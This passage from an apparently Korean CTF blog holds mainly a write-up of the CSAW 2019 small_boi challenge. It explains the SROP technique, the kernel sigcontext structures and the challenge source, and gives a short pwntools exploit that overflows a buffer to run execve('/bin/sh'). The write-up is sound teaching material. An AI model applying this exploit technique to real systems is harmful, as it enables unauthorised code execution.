href=\"#freeplt6\">free@plt+6</a></li>\n<li><a href=\"#exploit-code\">exploit code</a></li>\n<li><a href=\"#get-flag\">get flag</a></li>\n</ul>\n</div>","excerpt":"취약점 분석 바이너리 개요 보호기법 main 함수 분석 argc 스택 주소가 노출되는 것을 확인할 수 있으며, 총 4개의 메뉴를 선택할 수 있다. Add 메뉴는 동적 할당을 진행한다. Change는 해당 할당되어진 값을 변경한다. Delete는 해제 Check는 할당된 값을 확인할 수 있다. add 함수 add func <1:0x80, 2:0x110, 3:0x128, 4:0x150, 5:0x200> size를 선택해서 그 사이즈를 통해 동적 할당 add func 마지막 tIndex 증가 배열 설정한 구조체 대입  change 함수 할당되어진 구조체의 destination 부분을 변경할 수 있으며 tIndex 부분을 사용자가 직접 입력하여 trips 구조체의 주소 부분에 접근이 가능하다. choice 가 tIndex보다 클경우 함수를 종료하는 제어 문이 존재 하지만 해당 함수에서는 취약한 점이 존재한다.  데이터 타입은 signed 이기 때문에 음수를 처리할 수 있다 그렇다면 해당 …","frontmatter":{"date":"September 18, 2020","title":"CSAW 2019 traveller 취약점 분석","categories":"CTF","author":"Zer0Luck","emoji":"🍚"},"fields":{"slug":"/csaw2019_travelle_ctf_writeup/"}},"next":{"id":"7aa9785d-9403-57d9-97d5-658045915602","html":"<h1 id=\"취약점-분석\" style=\"position:relative;\"><a href=\"#%EC%B7%A8%EC%95%BD%EC%A0%90-%EB%B6%84%EC%84%9D\" aria-label=\"취약점 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>취약점 분석</h1>\n<blockquote>\n<p>SROP</p>\n<ul>\n<li>\n<p>리눅스에서는 시그널이 들어오게 되면 커널 모드에서 처리한다.</p>\n</li>\n<li>\n<p>커널 모드에서 유저모드로 들어오는 과정에서 유저의 스택에 레지스터 정보들을 저장해 놓는다.</p>\n</li>\n<li>\n<p><code class=\"language-text\">rt_sigreturn</code> 은 이렇게 저장해놓은 정보들을 다시 돌려놓을 때 사용된다.</p>\n</li>\n<li>\n<p>공격자가 <code class=\"language-text\">rt_sigreturn</code> 시스템 콜을 호출할 수 있고 스택을 조작할 수 있다면 모든 레지스터와 > 세그먼트를 조작할 수 있다.</p>\n</li>\n<li>\n<p><code class=\"language-text\">rt_sigreturn</code> 시스템 콜을 사용하여 익스폴로잇 하는 기법을 SigReturn Oriented Programming > (SROP)라고 한다.</p>\n</li>\n</ul>\n</blockquote>\n<h2 id=\"restore_sigcontext\" style=\"position:relative;\"><a href=\"#restore_sigcontext\" aria-label=\"restore_sigcontext permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>restore_sigcontext</h2>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token keyword\">static</span> <span class=\"token keyword\">int</span> <span class=\"token function\">restore_sigcontext</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">pt_regs</span> <span class=\"token operator\">*</span>regs<span class=\"token punctuation\">,</span>\n\t\t\t      <span class=\"token keyword\">struct</span> <span class=\"token class-name\">sigcontext</span> __user <span class=\"token operator\">*</span>sc<span class=\"token punctuation\">,</span>\n\t\t\t      <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> uc_flags<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> buf_val<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">void</span> __user <span class=\"token operator\">*</span>buf<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> tmpflags<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> err <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token comment\">/* Always make any pending restarted system calls return -EINTR */</span>\n\tcurrent<span class=\"token operator\">-></span>restart_block<span class=\"token punctuation\">.</span>fn <span class=\"token operator\">=</span> do_no_restart_syscall<span class=\"token punctuation\">;</span>\n\tget_user_try <span class=\"token punctuation\">{</span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">ifdef</span> <span class=\"token expression\">CONFIG_X86_32</span></span>\n\t\t<span class=\"token function\">set_user_gs</span><span class=\"token punctuation\">(</span>regs<span class=\"token punctuation\">,</span> <span class=\"token function\">GET_SEG</span><span class=\"token punctuation\">(</span>gs<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">COPY_SEG</span><span class=\"token punctuation\">(</span>fs<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">COPY_SEG</span><span class=\"token punctuation\">(</span>es<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">COPY_SEG</span><span class=\"token punctuation\">(</span>ds<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">endif</span> <span class=\"token comment\">/* CONFIG_X86_32 */</span></span>\n\t\t<span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>di<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>si<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>bp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>sp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>bx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>dx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>cx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>ip<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>ax<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">ifdef</span> <span class=\"token expression\">CONFIG_X86_64</span></span>\n\t\t<span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>r8<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>r9<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>r10<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>r11<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>r12<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>r13<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>r14<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>r15<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n         <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li><code class=\"language-text\">COPY</code>, <code class=\"language-text\">COPY_SEG</code> 매크로를 사용하여 레지스터및 세그먼트를 복원한다.</li>\n</ul>\n<h2 id=\"sigcontext-32bit\" style=\"position:relative;\"><a href=\"#sigcontext-32bit\" aria-label=\"sigcontext 32bit permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>sigcontext-32bit</h2>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token keyword\">struct</span> <span class=\"token class-name\">sigcontext</span>\n<span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> gs<span class=\"token punctuation\">,</span> gsh<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> fs<span class=\"token punctuation\">,</span> fsh<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> es<span class=\"token punctuation\">,</span> esh<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> ds<span class=\"token punctuation\">,</span> dsh<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> edi<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> esi<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> ebp<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> esp<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> ebx<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> edx<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> ecx<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> eax<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> trapno<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> err<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> eip<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> cs<span class=\"token punctuation\">,</span> __csh<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> eflags<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> esp_at_signal<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> ss<span class=\"token punctuation\">,</span> __ssh<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">struct</span> <span class=\"token class-name\">_fpstate</span> <span class=\"token operator\">*</span> fpstate<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> oldmask<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> cr2<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span></code></pre></div>\n<h2 id=\"sigcontext-64bit\" style=\"position:relative;\"><a href=\"#sigcontext-64bit\" aria-label=\"sigcontext 64bit permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>sigcontext-64bit</h2>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token keyword\">struct</span> <span class=\"token class-name\">sigcontext</span>\n<span class=\"token punctuation\">{</span>\n  __uint64_t r8<span class=\"token punctuation\">;</span>\n  __uint64_t r9<span class=\"token punctuation\">;</span>\n  __uint64_t r10<span class=\"token punctuation\">;</span>\n  __uint64_t r11<span class=\"token punctuation\">;</span>\n  __uint64_t r12<span class=\"token punctuation\">;</span>\n  __uint64_t r13<span class=\"token punctuation\">;</span>\n  __uint64_t r14<span class=\"token punctuation\">;</span>\n  __uint64_t r15<span class=\"token punctuation\">;</span>\n  __uint64_t rdi<span class=\"token punctuation\">;</span>\n  __uint64_t rsi<span class=\"token punctuation\">;</span>\n  __uint64_t rbp<span class=\"token punctuation\">;</span>\n  __uint64_t rbx<span class=\"token punctuation\">;</span>\n  __uint64_t rdx<span class=\"token punctuation\">;</span>\n  __uint64_t rax<span class=\"token punctuation\">;</span>\n  __uint64_t rcx<span class=\"token punctuation\">;</span>\n  __uint64_t rsp<span class=\"token punctuation\">;</span>\n  __uint64_t rip<span class=\"token punctuation\">;</span>\n  __uint64_t eflags<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> cs<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> gs<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> fs<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> pad0<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">uint64_t</span> err<span class=\"token punctuation\">;</span>\n  __uint64_t trapno<span class=\"token punctuation\">;</span>\n  __uint64_t oldmask<span class=\"token punctuation\">;</span>\n  __uint64_t cr2<span class=\"token punctuation\">;</span>\n  extension <span class=\"token keyword\">union</span>\n    <span class=\"token punctuation\">{</span>\n      <span class=\"token keyword\">struct</span> <span class=\"token class-name\">_fpstate</span> <span class=\"token operator\">*</span> fpstate<span class=\"token punctuation\">;</span>\n      __uint64_t __fpstate_word<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n  __uint64_t __reserved1 <span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span></code></pre></div>\n<ul>\n<li>해당 <code class=\"language-text\">sigcontext</code> 구조체를 바탕으로 SROP 기법으 이용하여 공격을 진행할 수 있다.</li>\n</ul>\n<h2 id=\"문제-small_boic\" style=\"position:relative;\"><a href=\"#%EB%AC%B8%EC%A0%9C-small_boic\" aria-label=\"문제 small_boic permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>문제 small_boi.c</h2>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token comment\">/* I wonder what you have to do with this sigreturn gadget */</span>\n<span class=\"token keyword\">volatile</span> <span class=\"token keyword\">void</span> <span class=\"token function\">one_true_gadget</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">asm</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"mov $0xf, %eax;\"</span> <span class=\"token comment\">// sigreturn</span>\n        <span class=\"token string\">\"syscall;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">asm</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"poprax:\"</span>\n    <span class=\"token string\">\"pop %rax;\"</span>\n    <span class=\"token string\">\"ret;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>useful_string <span class=\"token operator\">=</span> <span class=\"token string\">\"/bin/sh\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">char</span> useful_byte <span class=\"token operator\">=</span> <span class=\"token string\">'i'</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">char</span> buf<span class=\"token punctuation\">[</span><span class=\"token number\">32</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">asm</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"mov %0, %%rsi;\"</span>\n        <span class=\"token operator\">:</span>\n        <span class=\"token operator\">:</span> <span class=\"token string\">\"r\"</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span>\n        <span class=\"token operator\">:</span> <span class=\"token string\">\"%rsi\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">asm</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"xor %rax, %rax;\"</span>\n        <span class=\"token string\">\"xor %rdi, %rdi;\"</span>\n        <span class=\"token string\">\"mov $0x200, %rdx;\"</span>\n        <span class=\"token string\">\"syscall;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n    <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">asm</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"xor %rdi, %rax;\"</span>\n        <span class=\"token string\">\"mov $60, %rax;\"</span>\n        <span class=\"token string\">\"syscall;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>문제 바이너리를 분석해 보면 <code class=\"language-text\">sigreturn</code> , <code class=\"language-text\">/bin/sh</code>, <code class=\"language-text\">syscall</code> 등 익스를 하기에 필요한 명령들이 있는 것을 확인할 수 있으며</li>\n<li>카니리 보호 기법이 걸려 있지 않아 버퍼 오버플로우를 발생시켜 return 주소를 sigreturn call 하여 SROP를 할 수 있다.</li>\n<li>main 함수에서 read 함수를 바탕으로 0x200 바이트를 입력 받기 때문에 버퍼 오버플로우가 발생한다.</li>\n</ul>\n<h2 id=\"srop\" style=\"position:relative;\"><a href=\"#srop\" aria-label=\"srop permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SROP</h2>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\">binshell <span class=\"token operator\">=</span> <span class=\"token number\">0x4001ca</span>\nsi_return <span class=\"token operator\">=</span> <span class=\"token number\">0x400180</span>\nsyscall <span class=\"token operator\">=</span> <span class=\"token number\">0x400185</span>\n\nframe <span class=\"token operator\">=</span> <span class=\"token function\">SigreturnFrame</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\nframe<span class=\"token punctuation\">.</span>rax <span class=\"token operator\">=</span> constants<span class=\"token punctuation\">.</span>SYS_execve\nframe<span class=\"token punctuation\">.</span>rdi <span class=\"token operator\">=</span> binshell\nframe<span class=\"token punctuation\">.</span>rsi <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\nframe<span class=\"token punctuation\">.</span>rdx <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\nframe<span class=\"token punctuation\">.</span>rip <span class=\"token operator\">=</span> syscall\n\npayload <span class=\"token operator\">=</span> <span class=\"token function\">p8</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x90</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">40</span><span class=\"token operator\">+</span><span class=\"token function\">p64</span><span class=\"token punctuation\">(</span>si_return<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token function\">str</span><span class=\"token punctuation\">(</span>frame<span class=\"token punctuation\">)</span>\n<span class=\"token function\">sl</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\n<span class=\"token function\">irt</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre></div>\n<ul>\n<li>SROP를 하기 위해서는 구조체의 값을 일일이 다 맞쳐서 짜야 한다는 점이 있지만 pwntools의 도구를 사용하여 손 쉽게 해당 레지스터에 필요한 값을 줄 수 가 있다.</li>\n<li>우리는 execve 시스템 콜을 사용하여 /bin/sh 주소를 인자로 사용하여 쉘을 획득하면 된다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 62.77777777777778%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAIAAAAmMtkJAAAACXBIWXMAAAsTAAALEwEAmpwYAAACGElEQVQoz22O267aMBBF+ZCeBBKPPWM7duwQciHBQMIhcK6ifexTpf7/L1SBStWRKi1Z1thr9l6c6nYapn6Y+uNlN15t2WZFnZfbrGi0r+2md3UvfR2JLAYZM4oZRQyXIJeAi0zZ6+tHE8aVaiE/rlQdUR2rLsIyphp0zcAKXCOVQrmV0EthE3Ip2USoBc/c9fN70+0zMJ5chibHfE1eo1Wy2FpXAXYcOxCGsgTNSliu14JMOssqv3zc2t2hSqAHLAFrwAAi51KhqzNXADWcGqBZFioRBpTnDxmkDafJVa2RZg1kgBxQOV+kBVVwaRh6IA+kKUsxW/E5Hx4yZv7nr9/P17cD0ItQgctByFeOtXKlbSfj90ATlxdOG20ZZow82UYqx0kvuLLXj1u1DUUCFcM8FUUqGoYOyDKhUoFAcgYRNeMq5XN+wuUKaKHLbnq/9YeTUtb7Te5K7yspsyQVMcMnhtH9fGK45LQEiplccRmz+XVxLqrSlTLfaFeadb0EWnI5CwmPUhEl/OlOlIiZ+8YoxZjNLPbavoxTP05VF9owlE2vXYnGCZ1zZYXOlS1kvhbaCmVBmof2Vw7t7vX9dvn8EcZzdzjtT1MYz004Vv2h6Q+74bw7nreHU9n2ZLzQ+Rf54tbPYQjPL9sw+E0bM/y2gkfne0PxIE7F3P8+/CdX0hx3w/HyFsZzGC+74VzUHaMs+vrvv/wBNGWNQ8hTIrEAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./0.png\"\n        title=\"./0.png\"\n        src=\"/static/74e85d1e0257e52b19b4afbfd362849d/37523/0.png\"\n        srcset=\"/static/74e85d1e0257e52b19b4afbfd362849d/e9ff0/0.png 180w,\n/static/74e85d1e0257e52b19b4afbfd362849d/f21e7/0.png 360w,\n/static/74e85d1e0257e52b19b4afbfd362849d/37523/0.png 720w,\n/static/74e85d1e0257e52b19b4afbfd362849d/7e509/0.png 745w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"table-of-contents\">\n<ul>\n<li><a href=\"#restore_sigcontext\">restore_sigcontext</a></li>\n<li><a href=\"#sigcontext-32bit\">sigcontext-32bit</a></li>\n<li><a href=\"#sigcontext-64bit\">sigcontext-64bit</a></li>\n<li><a href=\"#%EB%AC%B8%EC%A0%9C-small_boic\">문제 small_boi.c</a></li>\n<li><a href=\"#srop\">SROP</a></li>\n</ul>\n</div>","frontmatter":{"date":"September 18, 2020","title":"CSAW 2019 small_boi 취약점 분석","categories":"CTF","author":"Zer0Luck","emoji":"🍗"},"fields":{"slug":"/csaw_small_boi_ctf_writeup/"}},"prev":{"id":"812e049c-90ef-548b-ab1c-ca8d05b7f5d2","html":"<h1 id=\"취약점-분석\" style=\"position:relative;\"><a href=\"#%EC%B7%A8%EC%95%BD%EC%A0%90-%EB%B6%84%EC%84%9D\" aria-label=\"취약점 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>취약점 분석</h1>\n<h2 id=\"바이너리-개요\" style=\"position:relative;\"><a href=\"#%EB%B0%94%EC%9D%B4%EB%84%88%EB%A6%AC-%EA%B0%9C%EC%9A%94\" aria-label=\"바이너리 개요 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 